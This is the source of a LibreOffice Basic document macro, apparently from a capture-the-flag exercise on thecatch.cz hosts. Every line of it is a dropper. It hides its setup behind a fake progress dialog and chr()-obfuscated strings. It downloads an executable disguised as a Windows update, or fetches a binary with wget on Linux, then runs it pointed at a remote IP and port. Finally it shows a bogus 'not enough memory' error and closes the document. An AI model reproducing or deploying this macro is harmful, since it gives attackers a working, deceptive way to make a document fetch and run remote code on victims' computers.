
Private Declare Function downloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Sub Main()
    guiType = GetGUIType
    Dim O0O0000OO   As Object, progressBar As Object, dialog As Object
    Dim i   As Long
    urls = Array("http://challenger.thecatch.cz:20101", "http://freedata.thecatch.cz:20101", "http://www.challenges.thecatch.cz:20101", "http://wordpress.thecatch.cz:20101", "http://root.thecatch.cz:20101", "http://challenges.thecatch.ex:20101", "http://challenges.thecatch.example:20101", "http://challenges.thecatch.mirror:20101", "http://challenges.thecatch.cz:20101")
    'OOO000OOO = Array(chr(883-184-101-230-242-173+258-177)+chr(499+27-159-223-40)+chr(65-157-169+377)+chr(-678+430-108-444+230+551-189-233+557)+chr(749-271+360+289-462-553)+chr(1141-21-333-313-363-53)+chr(299-303+54-232+51+178)+chr(-149+152-71-31+3+308-165)+chr(532-155+309-587)+chr(1065-375+395-186-251-582+38)+chr(-574+171+223-236+513)+chr(1946-331-630-460+103-520)+chr(898+84-572-318+16)+chr(-773-94+380-464+474-14+464+32+96)+chr(849+491+66-195-107-554-8+176-608)+chr(-230+185+207+164-140-83)+chr(370-85+540+152-476-283+128-245)+chr(606+172-559+391+27-42-481)+chr(55+113-122)+chr(343+622-412-433-82-238+8-216+524)+chr(-68-331+503)+chr(-200-288+232+46-178-155+159+485)+chr(-322+249-383-281+251+550+235-427+227)+chr(-1899+466+267+3+397+483-62+442)+chr(1634-632-193-134+73-632)+chr(-74-359+212+216+353+5-339+388-303)+chr(253+257-406)+chr(123-182-276+297-310+270+124)+chr(-701+230-125+252+443)+chr(-3037+235-78+634+690+585+570+523)+chr(-28-243+66-225+370-151-181+387+63)+chr(945+284-236+46+34-306-284-288-145)+chr(-465+298-0+81+134)+chr(278-331+289-146+202-3-232)+chr(451+12-265-8+106-333-15+165-64)+chr(345-282-301+288)+chr(308-4-179+8+56-155), chr(144+105-150-65)+chr(-529-345+468-297-135-498+377+587+476)+chr(-1581+573+253+596+194-264+192-53+206)+chr(675+329-51-352-678+553-314-46)+chr(796+223+326-411-225-597)+chr(480-383-39)+chr(196-197+48)+chr(865-306-145+307-303+33-179-225)+chr(725-485+254+16-164-244)+chr(-328+580-282+162+648-257-409)+chr(1021-56-387+85-562)+chr(-1015+583+282+251)+chr(38-164-175+164+319-565+483)+chr(1203-335-249-438-499+501-221-247+382)+chr(384-266+44+127+252-44+34-415)+chr(-975-431+432+502+270-266+565)+chr(-229+224+58+0+3+150+232-268-124)+chr(859-447-296)+chr(-584+310+125+268-15)+chr(34+48+270+276-227-300)+chr(986-329-273-436-141+292)+chr(-280-59+554-530+412)+chr(-122-289+522-467+472)+chr(1053-542+188-453-147)+chr(-168+390-420+289+233-229-606+615)+chr(737+199-57-221-324-85-203)+chr(163-287-418+451+320+372-502)+chr(494-272-313+213)+chr(455+364-1-121-194-141-168-136)+chr(680-267-67-72-224)+chr(287-296-257+314)+chr(1201-300-267+4-126+0+1-136-320)+chr(471-275-56+200-304-216+40+189)+chr(-121-2+208+199+284-207+76-275-112)+chr(483-73-257-204+85), chr(-494-120+132-33+173+80+72+207+17)+chr(-365+44+303-94+262+144-190)+chr(230-13-101)+chr(294+40+493+176+243-634-496)+chr(1046-76+128-421-565)+chr(373-225-27-268-52+257+0)+chr(-36-54-222+316+297-254)+chr(-258+240+86-21+13-13)+chr(-49-32+200)+chr(222-465+362)+chr(-1744-75+259+690+601+381+7)+chr(-223+269+269+103-82-290)+chr(142-409-298+89+573+105-297+194)+chr(1192-304-587-195-592+556+491-332-125)+chr(745+91-480-55-290+291-330-408+533)+chr(-641+241+518-453+443)+chr(1527-584-135-589-111)+chr(273-43-467+513-175)+chr(-1456-338+637+449+515+427-585-126+587)+chr(-227-131-115+585+580-116+78-392-159)+chr(212-269+545-106+203-313-171)+chr(146+138+326-495)+chr(39+246-16+154+80+107-328-236)+chr(-419+382+91-400+628+113-21-520+262)+chr(-87-306+519-392-145+343+335-163)+chr(16+197-302+522-241-218+127)+chr(-555+373+442-132-184+155)+chr(-60+382-225)+chr(1304-426-622+448-591+228-511+312-26)+chr(513+113-477+325-410+35)+chr(130+195-318-330-579+429+106+91+380)+chr(175-266+43+300-95-204-71-121+285)+chr(250-305-147+301)+chr(281+679-611+383-610)+chr(-778-41+317-111+212+358-258+50+309)+chr(469+111-334-196)+chr(217-80-89)+chr(-155+280+54+103+96+216-166-371)+chr(-317+277+308+250-220-259-57+67)+chr(202+65+117+333-326+3-183-66-95)+chr(-22-138+102+189+191+161-256-123-70), chr(-80+94-250+270)+chr(112-481+265+336-128)+chr(1372-670-80+128-310-267-57)+chr(957-387-454)+chr(517-535+60+70)+chr(204-114-134-99+201)+chr(263-31-315+130)+chr(-40-320+82-9+165-157+285+41)+chr(-1364+62-41+673+139+466+184)+chr(-692-179-10+354+638)+chr(153+203-539-518-159+633-161+502)+chr(-819+343+486+382-257-37+313-311)+chr(66+498-452)+chr(687-484-89)+chr(54-562+242+363-313-20+337)+chr(283+490-302-203-274+121)+chr(2592+316-267-82-615-616-598-615)+chr(-239-141+257+109+60)+chr(820+53-637-120)+chr(1224-562-558)+chr(308+339-546)+chr(1419-428-175-502-215)+chr(-471+585-17)+chr(396-222+360+69+654-522-607-12)+chr(879-457+139-587+464+565-174-287-443)+chr(974-355+443-3-371-144-46-394)+chr(137+95-232-3+304-255)+chr(-280-312+163+303+144+98+104-121)+chr(-216+418+228+283-419-234+492-430)+chr(335+116-324-354+285)+chr(-169+6+336-138-113+128)+chr(-1061-153+277+80+23+330+212+86+254)+chr(-280-32+240+34+336-241)+chr(231+324+242-155-197-50-181-165)+chr(-492+201+46+295)+chr(216-235+53), chr(-295-83+152+47+185-124-95+247)+chr(-551-18+480+491+234-48+580-616-448)+chr(1455+24-343-353+176-485-358)+chr(-764+382+498)+chr(94+65-404+184+436-263)+chr(338-107-173)+chr(-440+319+95+73)+chr(256-330+329+45-305+15+37)+chr(62-70+122)+chr(1047+281-244-363-654-648+281+411)+chr(-264+436+343-119-446+161)+chr(126+413-423)+chr(658-145-189-278)+chr(0+473+315-446-223+413-443+524-497)+chr(942-400+524-432+197-384-584+319-78)+chr(-46-84-374-241-187+432+601)+chr(522+288-9+59-342+106-525)+chr(-455-99+101+540+10)+chr(30+282-192-230+226)+chr(-44+278+249+64-314+372-506)+chr(-883+65+547+409+86+42+316-220-258)+chr(-107-10+309-312+166)+chr(306+545-563-548+359)+chr(646-496+445-221+152-361+231-274)+chr(217+318-75-321-109+386-189-280+111)+chr(241-330+257-64+36-122+197+157-322)+chr(-206+161+297-204)+chr(96+80+284-233-238-86+364+159-369)+chr(-520-131-328+237+188+281+322)+chr(172+13+301+96-193-339)+chr(151-247-75+266+160-221), chr(13-98+119)+chr(1807-567-561-575)+chr(-118+332-119+192-302+131)+chr(-886-377+583+561+235)+chr(-1284+224+624+439+616-398-109)+chr(-250+140+73+154+143-202)+chr(268-113-154-221+148-186-124+137+292)+chr(-525-17+9+37+135+247+161)+chr(-1036+377-53+516-84+574-195)+chr(993-254+79-185-529)+chr(404-414+232+395-563-506-373+360+562)+chr(642-540-394-49-149+598)+chr(2121-339-546+278-1-589-270+46-592)+chr(-255+405+184-233)+chr(852+600-9-69-123+309-470-634-346)+chr(1130-219+64-590-267-149+134)+chr(-1225+455-513+482+487+560-350-104+309)+chr(694-319-260)+chr(-132-37+215)+chr(-72+160+326+461+42-506+428-498-225)+chr(228-73-500+497+433-254-401-442+616)+chr(585+203+499-239-542-538+133)+chr(973-312+185-414+17-423+481-408)+chr(-70+391+11+212-183-264)+chr(439-626-235-312+136+263+451)+chr(-577+440+281-513-546+205+447+378-16)+chr(813-519+179-369)+chr(-253+278+282-118-143)+chr(1302-113-567+425-530-400+447-463)+chr(-291-100+511)+chr(295+30+48-283-83+136+108-390+197)+chr(-302+137+110+105)+chr(-37+209-111-79+66)+chr(-176-47+329-102+202-212+295-232)+chr(570-300-292+71)+chr(163-287+289+222-26+141-158-294)+chr(-501+216-240+54-24+145+147+237), chr(-329+11+122+40+65-129+254)+chr(486-441+245-405+384-165)+chr(-745+480+376-391+454-58)+chr(-1159-399+581+505-310+622+276)+chr(50-141-133-155+527-595+565-6)+chr(318+199-276-183)+chr(435-201+85+218+165-311-325-19)+chr(-190+73+25+139)+chr(675-186-390)+chr(-1337+93-150+537+537+82+262-169+249)+chr(-485+88+394+275+151+57+37-420)+chr(-54-292+627+442-615)+chr(-807+57+356+243+259)+chr(1019-477+150+325-432-521+16+234-213)+chr(-343+218-402-132+382+387)+chr(267-130+414+64-565-88-246+387)+chr(-1530+484+89+585+176-156+445+8)+chr(-1240+614+40+495-430+636)+chr(-231+321-227+183)+chr(-88-579+616+12+524-100-536+267)+chr(796+428+440-571-305+81-254-558+47)+chr(1714-514-180-536-106-569+224+68)+chr(186-252-91+593-337)+chr(520+490-18-98-201+41-88-383-166)+chr(166-180-29+199+557-597)+chr(874-242-131-402)+chr(-275+498-119)+chr(-567-1+250-53+327+234-0-144)+chr(-819+565+164-498+387+433+238-369)+chr(-332+193+315+428-190+316-254-356)+chr(964-226-223-137-187-27-261+220-26)+chr(737-478+346+277-564+342-90-461)+chr(-713+456+120+243-584+590)+chr(-615-599+339-193+488+420+268)+chr(-730+388+443)+chr(-546+135+295+174)+chr(671-154-302+103-268)+chr(540-192+318+41-254-316-113-224+248)+chr(-185-85-238-181+263+135+348)+chr(399+146+36-204-328)+chr(-321+138+227-89-100-149-127+210+261)+chr(-118+185-129-170+93-11+184), chr(-561+180+266+211-75+38+172+16-213)+chr(35-187+256)+chr(-455+233-128+205+333-402+330)+chr(45+587-516)+chr(-1571+132+242+247+468+380+214)+chr(301+53+317-350-239+219-243)+chr(64+252-247-98+270+108-281-21)+chr(-22+163-94)+chr(614-104-64-397+50)+chr(55-335+384)+chr(888-387-577+131+406-118-137-109)+chr(122-347+208+582-213-244)+chr(340-361+394+515+382-507-102-553)+chr(148+128-191-330+346)+chr(-1004+34+510+178-121+513)+chr(194+79-157-536-27+518+32)+chr(793-454-238)+chr(-1426+547+654-3+343)+chr(83-302-227-39+268+263)+chr(-189+38+267)+chr(409-35-285+0-463-135+613)+chr(1113-175-381-568-251+363)+chr(-1724+227+459+196+420+131+418-28)+chr(523-348-49-29)+chr(-180-70-9-222+597)+chr(-533-258+322+586+124-142)+chr(-350+578-186+62)+chr(519-224-88-295+134)+chr(-92+536-318-232+41-90+193-325+396)+chr(-422+495+32)+chr(225-29-589-325+133+557+60+82)+chr(171-563+276+230)+chr(-659-258+130-367+52+437+191+336+249)+chr(-876+67+156+632-346+56+493-39-29)+chr(321-293-137+215-291+142+15-221+307)+chr(-89+60-30+109)+chr(631-153-312-167-337-40+140+286)+chr(616-310-249)+chr(434-85+222-40-214-268)+chr(452-54-348)+chr(205-173+2), chr(143+4+94-207)+chr(-338-68+173+388+104-598+326-207+324)+chr(1639+413-344-605-153-249-486+474-573)+chr(1+255-332-320+595-93-622+632)+chr(459+197+281-379+587-424-528-233+152)+chr(941-163-192+205-68-229-356-80)+chr(561+80-331-120-38+101+119-325)+chr(7+68-238-168+198+142+38)+chr(-245+350-203-463+581+98+166-185)+chr(-1563+414+614-232+129+156+343+243)+chr(-134-324+555)+chr(516-433+88-410+516-3+63-600+371)+chr(-121+576-54+134-317-470+67+293)+chr(252+113-236-28)+chr(262+619-616-155)+chr(-32+317-312+248-338+127+93)+chr(914+130-592+67+214-338-294)+chr(1012-551-415-351+648-330-156+258)+chr(34-58+95-254+77+152)+chr(220-635-2-203+617-128-265+512)+chr(20-497+534+97-555+36+417+455-403)+chr(-255+46-117+596-202+33)+chr(-1997+313+242+346+559+469+167)+chr(268-23-491+134+209)+chr(681-653+88)+chr(-792+116+283+531+7+566-550+522-584)+chr(822-319-399)+chr(-379+134+291+173-173)+chr(-1105-257+472+66+492+352+77+2)+chr(325-676+593-326+664-458)+chr(-186-293+216-212+124+188-12-98+331)+chr(-169+279+286-285+210-271)+chr(304-174-328-72+265-154+207)+chr(60+280+346-283-58-288)+chr(-173+259+77+73-22-15-150)+chr(-97+0+147)+chr(-115+81-5+4+165-261+92+73))
    Dim attemptCounter
    attemptCounter = 0
    Dim magicChar
    While TRUE
        wait(1000)
        ' randNum = int(Rnd()*10000) ' From 0 to 9999
        randNum = 10500
        url = urls(0)
        magicChar = 10
        magicChar = magicChar + 60
        
        If 0 <= randNum And randNum < 1000 Then
            url = urls(1)
        ElseIf 1000 <= randNum And randNum < 2000 Then
            url = urls(2)
        ElseIf 2000 <= randNum And randNum < 3000 Then
            url = urls(3)
        ElseIf 3000 <= randNum And randNum < 5000 Then
            url = urls(4)
        ElseIf 5000 <= randNum And randNum < 6000 Then
            url = urls(5)
        ElseIf 6000 <= randNum And randNum < 9998 Then
            url = urls(6)
        ElseIf 9998 <= randNum And randNum < 10000 Then
            url = urls(7)
        ElseIf 10000 <= randNum And randNum < 110000 Then ' Will never happen
            url = urls(8)
        End If
        
        'O00O0OO0O = OOO000OOO(43+9-33-56+42-2)
        Dim secretString
        DialogLibraries.loadLibrary("Standard")
        dialog = CreateUnoDialog(DialogLibraries.Standard.Dialog1)
        Const const1 = 0
        Const const2 = 40
        Const const3 = 4
        progressBar = dialog.getModel().getByName( "ProgressBar1" )
        progressBar.setPropertyValue( "ProgressValueMin", const1)
        progressBar.setPropertyValue( "ProgressValueMax", const2)
        dialog.setVisible( TRUE )
        For i = 0 To 40 Step 4
            progressBar.setPropertyValue( "ProgressValue", i )
            Wait 100
            maxAttempts = 4
            secretString = secretString & chr(int(Rnd() * (0)) + magicChar)
            magicChar = magicChar + 3
        Next i
        secretString = left(secretString, 7)
        dialog.setVisible( FALSE )
        Select Case guiType:
            Case 1:
                path = Environ("TEMP") & "\" & "win10powerupdate.exe"
                If downloadToFile(0, url, path, 0, 0) = 0 Then
                    url = url & "/" & secretString & "_update_OB127q45D.msi"
                    Wait(2500)
                    Dim shell As Object
                    shell = createUnoService("com.sun.execute.system.SystemShellExecute")
                    shell.execute(ConvertToUrl(path), "-ip 78.128.216.92 -p 20210", 2)
                    MsgBox("Not enough memory for simulation, run it on another computer.", MB_OK + MB_ICONEXCLAMATION)
                    thisComponent.close(true)
                End If
            Case 4:
                path = "/tmp/update.bin"
                url = url & "/" & secretString & "_update_OB127q45D.msi"
                Shell("wget " & url & " -O " & path)
                If filelen(path) > 0 Then
                    Shell("chmod +x " & path)
                    Shell(path & " -ip 78.128.216.92 -p 20210")
                    MsgBox("Not enough memory for simulation, run it on another computer.", MB_OK + MB_ICONEXCLAMATION)
                    thisComponent.close(true)
                End If
        End Select
        attemptCounter = attemptCounter + 1
        If attemptCounter > maxAttempts Then
            MsgBox("Not enough entropy for simulation, restart computer and try again...", MB_OK + MB_ICONEXCLAMATION)
            thisComponent.close(true)
        End If
    Wend
End Sub